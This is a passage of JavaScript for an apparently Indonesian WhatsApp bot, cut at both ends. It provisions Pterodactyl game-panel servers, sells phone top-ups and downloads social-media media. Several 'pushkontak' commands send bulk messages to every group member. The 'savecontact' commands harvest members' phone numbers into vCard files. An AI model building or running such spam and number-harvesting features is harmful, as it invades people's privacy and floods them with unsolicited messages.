if (!isOwner && !isReseller) return onlyOr()
let t = text.split(',');
if (t.length < 2) return reply(`Contoh: ${prefix+command} Username,Nomor`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomNomor(100, 999) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`_Sedang Membuat Server..._`)
let ctf = `*PANEL ANDA AKAN SEGERA DATANG* 

❏︎ ❄ Username: ${user.username}
❏ ︎☀ Password: ${password.toString()}
❏︎ ☁ Server: ${global.ownername}
❏︎ 📦 Link Login: ${global.domain}

Note Penting: 
❏ Dilarang Memberikan Data Panel Ke Orang Lain︎
❏ Dilarang Buat Panel Unlimited Terlalu Banyak
❏ Dilarang Untuk Ddos Server
❏ Dilarang Untuk Memberikan Link Login Server
❏ Dilarang Membuat Akun Admin Panel Lain

Simpan Data Dan Patuhi Peraturan Diatas`
await Line.sendMessage(u, { text: ctf, quoted: m });
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`${monospace("PANEL CREATED")}

👤 *ID User*: ${user.id}
🆔 *UUID*: ${user.uuid}
📮 *Ram*: ${memo}
💿 *Disk*: ${disk}
💾 *Cpu*: ${cpu}%
📆 *Created At*: ${user.created_at}
📧 *Status*: *Berhasil✅*

*Data Berhasil Dikirim Ke Private Chat*`)
}
break

case 'suspend': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(`${global.domain}` + "/api/application/servers/" + srv + "/suspend", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Sukses suspend server')
}
break

case 'unsuspend': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(`${global.domain}` + "/api/application/servers/" + srv + "/unsuspend", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Sukses membuka suspend')
}
break

case 'reinstall': {
if (!isOwner) return onlyOwn()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(`${global.domain}` + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan')
m.reply('Mereinstall server...')
}
break

case 'startsrv':
case 'stopsrv':
case 'restartsrv': {
  if (!isOwner) return onlyOwn()
  let action = command.replace('srv', '')
  let srv = args[0]
  if (!srv) return m.reply('ID nya mana?')
  let f = await fetch(domain + "api/client/servers/" + srv + "/power", {
    "method": "POST",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey,
    },
    "body": JSON.stringify({
      "signal": action
    })
  })
  let res = f.ok ? {
    errors: null
  } : await f.json()
  if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
  m.reply(`Sukses ${action.toUpperCase()} server`)
}
break

//Push Menu
case 'pushkontak': {
  if (!isOwner) return onlyOwn()
  if (!m.isGroup) return onlyGrup()
  if (!text) return m.reply(`Mana teksnya?`)
  let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  let teksnye = `${q}`
  m.reply(`Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 8} detik`)
  for (let geek of mem) {
    await sleep(5000) // Jedanya
    Line.sendMessage(geek, {
      text: `${teksnye}`
    }, {
      quoted: m
    })
  }
  await loading()
  m.reply(`Sukses mengirim pesan Ke ${mem.length} orang`)
}
break

case 'pushkontak2': {
  if (!isOwner) return onlyOwn()
  let idgc = text.split("|")[0]
  let pesan = text.split("|")[1]
  if (!idgc && !pesan) return m.reply(`Contoh: ${p_c} idgc|pesan`)
  let metaDATA = await Line.groupMetadata(idgc).catch((e) => m.reply(e))
  let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
  let count = getDATA.length;
  let sentCount = 0;
  m.reply(`Sedang Push ID...\nMengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 8} detik`)
  for (let i = 0; i < getDATA.length; i++) {
    setTimeout(function () {
      Line.sendMessage(getDATA[i], {
        text: pesan
      });
      count--;
      sentCount++;
      if (count === 0) {
        m.reply(`Semua pesan telah dikirim!\nJumlah pesan terkirim: ${sentCount}`);
      }
    }, i * 7000); // Jedanya
  }
}
break

case 'pushkontakid': {
  if (!isOwner) return onlyOwn()
  if (!isPc) return onlyPrivat()
  if (!text) return m.reply(`Contoh: ${p_c} idgroup|teks`)
  await loading()
  const groupMetadataa = !m.isGroup ? await Line.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
  const participants = !m.isGroup ? await groupMetadataa.participants : ""
  const lalu = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  global.tekspushkon = text.split("|")[1]
  if (isContacts) return
  for (let mem of lalu) {
    if (isContacts) return
    contacts.push(mem)
    fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
    if (/image/.test(mime)) {
      media = await Line.downloadAndSaveMediaMessage(quoted)
      memk = await uptotelegra(media)
      await Line.sendMessage(mem, {
        image: {
          url: memk
        },
        caption: global.tekspushkon
      })
      await sleep(3000)
    } else {
      await Line.sendMessage(mem, {
        text: global.tekspushkon
      })
      await sleep(3000)
    }
  }
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      const vcard = [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        "",
      ].join("\n");
      return vcard;
    }).join("");
    fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    reply(util.format(err))
  } finally {
    await Line.sendMessage(from, {
      document: fs.readFileSync("./data/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "Pencet file di atas lalu save",
      mimetype: "text/vcard",
    }, {
      quoted: m
    })
    contacts.splice(0, contacts.length)
    fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
  }
}
break

case 'pushkontakgc': {
  if (!isOwner) return onlyOwn()
  if (!m.isGroup) return onlyGrup()
  if (!text) return m.reply(`Contoh: ${p_c} teks`)
  await loading()
  const groupMetadata = m.isGroup ? await Line.groupMetadata(from).catch(e => {}) : ""
  const groupOwner = m.isGroup ? groupMetadata.owner : ""
  const participantts = m.isGroup ? await groupMetadata.participants : ""
  const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
  global.tekspushkonv2 = text
  if (isContacts) return
  for (let men of halsss) {
    contacts.push(men)
    fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
    if (/image/.test(mime)) {
      media = await Line.downloadAndSaveMediaMessage(quoted)
      mem = await uptotelegra(media)
      await Line.sendMessage(men, {
        image: {
          url: mem
        },
        caption: global.tekspushkonv2
      })
      await sleep(3000)
    } else {
      await Line.sendMessage(men, {
        text: global.tekspushkonv2
      })
      await sleep(3000)
    }
  }
  m.reply('File kontak sudah di kirim lewat chat pribadi!')
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      const vcard = [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        "",
      ].join("\n");
      return vcard;
    }).join("");
    fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    m.reply(util.format(err))
  } finally {
    await Line.sendMessage(m.sender, {
      document: fs.readFileSync("./data/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "Pencet file di atas lalu save",
      mimetype: "text/vcard",
    }, {
      quoted: m
    })
    contacts.splice(0, contacts.length)
    fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
  }
}
break

case 'pushkontakidjd': {
  if (!isOwner) return onlyOwn()
  if (!text) return m.reply(`Contoh: ${p_c} idgroup|jeda|Teks`)
  await loading()
  const groupMetadataa = !m.isGroup ? await Line.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
  const participantss = !m.isGroup ? await groupMetadataa.participants : ""
  const lalu = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
  global.tekspushkonv3 = q.split("|")[2]
  for (let mem of lalu) {
    if (/image/.test(mime)) {
      media = await Line.downloadAndSaveMediaMessage(quoted)
      memk = await uptotelegra(media)
      await Line.sendMessage(men, {
        image: {
          url: mem
        },
        caption: global.tekspushkonv3
      })
      await sleep(q.split("|")[1])
    } else {
      await Line.sendMessage(mem, {
        text: global.tekspushkonv3
      })
      await sleep(q.split("|")[1])
    }
  }
  m.reply('Berhasil pushkontak!')
}
break

case 'pushkontakgcjd': {
  if (!isOwner) return onlyOwn()
  if (!isGroup) return onlyGrup()
  if (!text) return m.reply(`Contoh: ${p_c} jeda|teks`)
  await loading()
  const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  global.tekspushkonv4 = text.split("|")[1]
  for (let men of halsss) {
    if (/image/.test(mime)) {
      media = await Line.downloadAndSaveMediaMessage(quoted)
      mem = await uptotelegra(media)
      await Line.sendMessage(men, {
        image: {
          url: mem
        },
        caption: global.tekspushkonv4
      })
      await sleep(text.split("|")[0])
    } else {
      await Line.sendMessage(men, {
        text: tekspushkonv4
      })
      await sleep(text.split("|")[0])
    }
  }
  m.reply('Berhasil pushkontak!')
}
break

case 'savecontact': {
  if (!isOwner) return onlyGrup()
  if (!text) return m.reply(`Contoh: ${p_c} idgrup`)
  vreact()
  const groupMetadataa = !isGroup ? await Line.groupMetadata(`${text}`).catch(e => {}) : ""
  const participants = !isGroup ? await groupMetadataa.participants : ""
  const lalu = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
  for (let mem of lalu) {
    if (isContacts) return
    contacts.push(mem)
    fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
  }
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      const vcard = [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        "",
      ].join("\n");
      return vcard;
    }).join("");
    fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    m.reply(util.format(err))
  } finally {
    await Line.sendMessage(from, {
      document: fs.readFileSync("./data/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "Sukses, tinggal save ya kak",
      mimetype: "text/vcard",
    }, {
      quoted: m
    })
    contacts.splice(0, contacts.length)
    fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
  }
}
break

case 'savecontact2': {
  if (!isOwner) return onlyOwn()
  if (!m.isGroup) return onlyGrup()
  vreact()
  const groupmetadata = m.isGroup ? await Line.groupMetadata(from).catch(e => {}) : ""
  const groupCreator = m.isGroup ? groupmetadata.Creator : ""
  const participantts = m.isGroup ? await groupmetadata.participants : ""
  const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
  for (let men of halsss) {
    if (isContacts) return
    contacts.push(men)
    fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
  }
  m.reply("Sukses, file sudah dikirim lewat privat chat")
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      const vcard = [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${pushname}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        "",
      ].join("\n");
      return vcard;
    }).join("");
    fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    m.reply(util.format(err))
  } finally {
    await Line.sendMessage(senderr, {
      document: fs.readFileSync("./data/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "Sukses, tinggal save ya kak",
      mimetype: "text/vcard",
    }, {
      quoted: m
    })
    contacts.splice(0, contacts.length)
    fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
  }
}
break

case 'save': {
  if (!isOwner) return onlyOwn()
  let q = text.split('|');
  if (q.length < 2) return m.reply(`Contoh: ${p_c} nama|nomer`)
  let users = m.mentionedJid[1] ? m.mentionedJid[1] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let name = q[0];
  let phoneNumber = users.replace(/[^0-9]/g, '');
  if (phoneNumber.length === 11 && phoneNumber.startsWith('0')) {
    phoneNumber = '' + phoneNumber.substr(1);
  } else if (phoneNumber.length === 12 && phoneNumber.startsWith('00')) {
    phoneNumber = phoneNumber.substr(2);
  } else if (phoneNumber.length === 13 && phoneNumber.startsWith('+')) {
    phoneNumber = phoneNumber.substr(1);
  } else if (phoneNumber.length === 10) {
    phoneNumber = '' + phoneNumber;
  }
  phoneNumber = '' + phoneNumber;
  const uniqueContacts = [phoneNumber];
  let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${uniqueContacts}:+${uniqueContacts}\nEND:VCARD`
  await Line.sendMessage(m.chat, {
    contacts: {
      displayName: name,
      contacts: [{
        vcard
      }]
    }
  }, {
    quoted: m
  })
  m.reply(`Berhasil save nomor kamu, Svb ${ownername}`)
}
break

case 'cekidgc': {
  if (!isOwner) return onlyOwn()
  let getGroups = await Line.groupFetchAllParticipating()
  let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
  let anu = groups.map((v) => v.id)
  let teks = `${monospace("LIST  GRUP")}\n\nTotal grup: ${anu.length} Grup\n\n`
  for (let x of anu) {
    let metadata2 = await Line.groupMetadata(x)
    teks += `- Nama: ${metadata2.subject}\n- ID: ${metadata2.id}\n- Member: ${metadata2.participants.length}\n\n`
  }
  m.reply(teks)
}
break

case 'listgc': {
  if (!isOwner) return onlyOwn()
  if (!store.chats || typeof store.chats.all !== 'function') {
    return m.reply('Data chats tidak tersedia, pastikan store sudah terinisialisasi')
  }

  let anu = store.chats.all()
    .filter(v => v.id.endsWith('@g.us'))
    .map(v => v.id)

  if (!anu.length) {
    return m.reply('Tidak ada grup yang terdeteksi')
  }

  let tekslistgc = `${monospace("LIST GRUP CHAT")}\n`
  tekslistgc += `Total: ${anu.length}\n\n`
  
  for (let e of anu) {
    let metadata = await Line.groupMetadata(e).catch(_ => null)
    if (!metadata) continue
    tekslistgc += `Nama: ${metadata.subject}\n`
    tekslistgc += `Owner: ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
    tekslistgc += `ID: ${metadata.id}\n`
    tekslistgc += `Dibuat: ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
    tekslistgc += `Member: ${metadata.participants.length}\n\n\n`
  }

  m.reply(tekslistgc)
}
break
// === PPOB Indonesia

case 'topup-dana': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/topup-dana?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat menproses pembayaran')
  }
}
break

case 'topup-gopay': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/topup-gopay?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat menproses pembayaran')
  }
}
break

case 'topup-ovo': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/topup-ovo?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKedaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'pulsa-axis': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-axis?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'pulsa-indosat': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-indosat?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'pulsa-tsel': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-telkomsel?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'pulsa-tri': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-tri?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'pulsa-xl': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-xl?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

case 'tshopeepay': {
  let [nomor, total] = text.split`|`
  if (!text) return m.reply(`Contoh: ${p_c} 08xx|10000`)
  m.reply('Memproses pembayaran...')
  try {
    let res = await fetchJson(`https://api.neoxr.eu/api/topup-shopeepay?number=${nomor ? nomor : ''}&amount=${total ? total : ''}&apikey=${neoxrapi}`)
    if (res.status && res.data) {
      let hasil = res.data
      let buffer = Buffer.from(hasil.qr_image, 'base64')
      await Line.sendMessage(m.chat, {
        image: buffer,
        caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}`
      }, {
        quoted: m
      })
    }
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses pembayaran')
  }
}
break

// === Donlod Menu

case 'mfdl':
case 'mediafire': {
    try {
        if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
        if (!text.includes('mediafire.com')) return m.reply('Harus berupa link mediafire!')
        await vreact()
        let api = `https://api.vreden.my.id/api/mediafiredl?url=${text}`
        let res = await fetch(api)
        let data = await res.json()
        fileNama = decodeURIComponent(data.result[0].nama)
        var media = await getBuffer(data.result[0].link)
        if (data.result[0].mime.includes('mp4')) {
            Line.sendMessage(m.chat, {
                document: media,
                fileName: fileNama,
                mimetype: 'video/mp4'
            }, {
                quoted: m
            })
        } else if (data.result[0].mime.includes('mp3')) {
            Line.sendMessage(m.chat, {
                document: media,
                fileName: fileNama,
                mimetype: 'audio/mp3'
            }, {
                quoted: m
            })
        } else {
            Line.sendMessage(m.chat, {
                document: media,
                fileName: fileNama,
                mimetype: 'application/' + data.result[0].mime
            }, {
                quoted: m
            })
        }
    } catch (err) {
        m.reply('Terjadi kesalahan: '+err)
    }
}
break

case 'tt':
case 'ttdl':
case 'tiktok': {
try {
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
vreact()
let jir = await fetchJson(`https://skizo.tech/api/tiktok?apikey=${skizapi}&url=${text}`)
return await Line.sendMessage(m.chat, {video: {url: jir.media }, caption: `© ${wm}` }, {quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type === "nowatermark") {
return await Line.sendMessage(m.chat, { video: { url: imgs.url }, caption: `© ${wm}` }, { quoted: m })
} else if (imgs.type === "photo") {
if (c === 0) await Line.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di private chat' : ""}` }, { quoted: m })
else await Line.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}}
} catch (err) {
console.error('Kesalahan pada API vreden:', err)
m.reply('Terjadi kesalahan')
}}
}
break

case 'fb':
case 'fbdl':
case 'facebook': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    if (!text.includes('facebook.com')) return m.reply('Harus berupa link facebook!')
    vreact()
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${text}`)
        await Line.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_url
          },
          caption: `© ${wm}`
        }, {
          quoted: m
        })
  } catch (err) {
  try {
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${text}`)
        await Line.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_udl
          },
          caption: `© ${wm}`
        }, {
          quoted: m
        })
  } catch (err) {
    console.error('Kesalahan pada API:', err)
    m.reply('Terjadi kesalahan saat mengambil media')
  }}
}
break

case 'ig':
case 'igdl':
case 'instagram': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    if (!text.includes('instagram.com')) return m.reply('Harus berupa link instagram!')
    vreact()
    let jor = await fetchJson(`https://vapis.my.id/api/igdlv2?url=${text}`)
          await Line.sendMessage(m.chat, {
            video: {
              url: jor.data[0].url
            },
            caption: `© ${wm}`
          }, {
            quoted: m
          })
  } catch (err) {
  try {
    let jor = await fetchJson(`https://api.siputzx.my.id/api/d/igdl?url=${text}`)
          await Line.sendMessage(m.chat, {
            image: {
              url: jor.data[0].url
            },
            caption: `© ${wm}`
          }, {
            quoted: m
          })
  } catch (err) {
    console.error('Kesalahan pada API:', err)
    m.reply('Terjadi kesalahan saat mengambil media')
  }}
}
break

case 'twdl':
case 'twitter': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    await vreact()
    let twitter = await fetchJson(`https://deliriussapi-oficial.vercel.app/download/twitterdl?url=${text}`)
    Line.sendMessage(m.chat, {
      video: {
        url: twitter.data.video_sd
      },
      caption: `© ${wm}`
    }, {
      quoted: m
    })
  } catch (err) {
    m.reply(`Terjadi kesalahan`);
  }
}
break

case 'ccdl':
case 'capcut': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    if (!text.includes('capcut.com') && !text.includes('capcut.net')) return m.reply('Harus berupa link capcut!')
    vreact()
    let anu = await fetchJson(`https://api.vreden.my.id/api/capcutdl?url=${text}`)
    if (anu.result && anu.result.url) {
      return await Line.sendMessage(m.chat, {
        video: {
          url: anu.result.url
        },
        caption: `© ${wm}`
      }, {
        quoted: m
      })
    }
    } catch (err) {
      console.error(err)
      m.reply('Terjadi kesalahan')
    }
}
break

case 'videy':
case 'videydl': {
  try {
    if (!text) return m.reply(`Contoh: ${p_c} linknya`)
    await vreact()
    let twitter = await fetchJson(`https://vapis.my.id/api/videy?url=${text}`)
    Line.sendMessage(m.chat, {
      video: {
        url: twitter.data
      },
      caption: `© ${wm}`
    }, {
      quoted: m
    })
  } catch (err) {
    m.reply(`Terjadi kesalahan`);
  }
}
break

case 'spotify': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
  if (!text.includes('spotify.com', 'open.spotify')) return m.reply('Harus berupa link spotify!')
  try {
    vreact()
    const spotify = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${text}`)
    const details = `• *Judul:* ${spotify.result.title}\n• *Artis:* ${spotify.result.artists}\n• *Rilis:* ${spotify.result.releaseDate}`
    Line.sendMessage(m.chat, {
      audio: {
        url: spotify.result.music
      },
      mimetype: 'audio/mpeg',
      caption: details,
      ptt: false
    }, {
      quoted: m
    })
  } catch (err) {
